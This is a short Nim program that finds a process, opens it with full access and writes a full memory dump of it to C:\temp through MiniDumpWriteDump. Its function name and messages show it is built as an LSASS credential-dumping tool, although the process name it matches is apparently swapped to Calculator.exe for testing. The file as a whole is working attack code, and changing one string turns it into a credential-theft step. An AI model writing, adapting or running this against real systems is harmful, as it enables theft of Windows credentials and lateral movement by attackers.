import winim



type
    MINIDUMP_TYPE = enum
        MiniDumpWithFullMemory = 0x00000002

proc MiniDumpWriteDump(
    hProcess: HANDLE,
    ProcessId: DWORD,
    hFile: HANDLE,
    DumpType: MINIDUMP_TYPE,
    ExceptionParam: INT,
    UserStreamParam: INT,
    CallbackParam: INT
): BOOL {.importc: "MiniDumpWriteDump", dynlib: "dbghelp", stdcall.}


proc toString(chars: openArray[WCHAR]): string =
    result = ""
    for c in chars:
        if cast[char](c) == '\0':
            break
        result.add(cast[char](c))

proc GetLsassPid(): int =
    var
        entry: PROCESSENTRY32
        hSnapshot: HANDLE

    entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    defer: CloseHandle(hSnapshot)

    if Process32First(hSnapshot, addr entry):
        while Process32Next(hSnapshot, addr entry):
            if entry.szExeFile.toString == "Calculator.exe":
                return int(entry.th32ProcessID)

    return 0

proc main() =
    let processId: int = GetLsassPid()
    if not bool(processId):
        echo "[X] Unable to find lsass process"
        return

    echo "[*] lsass PID: ", processId

    var hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, cast[DWORD](processId))
    if not bool(hProcess):
        echo "[X] Unable to open handle to process"
        return

    var hFile: HANDLE

    try:
        hFile = CreateFileA(r"C:\temp\outdump_nim.dmp", cast[DWORD](GENERIC_READ.or(GENERIC_WRITE)), cast[DWORD](0), NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, cast[HANDLE](0))

        if not bool(hFile):
          echo "[X] Unable to open output file"
          return

        #var fs = open(r"C:\temp\proc.dump", fmWrite)
        echo "[*] Creating memory dump, please wait..."

        var success = MiniDumpWriteDump(
            hProcess,
            cast[DWORD](processId),
            hFile,
            MiniDumpWithFullMemory,
            0,
            0,
            0
        )
        echo "[*] Dump successful: ", bool(success)

        #fs.close()


    finally:
        CloseHandle(hProcess)
        CloseHandle(hFile)

main()
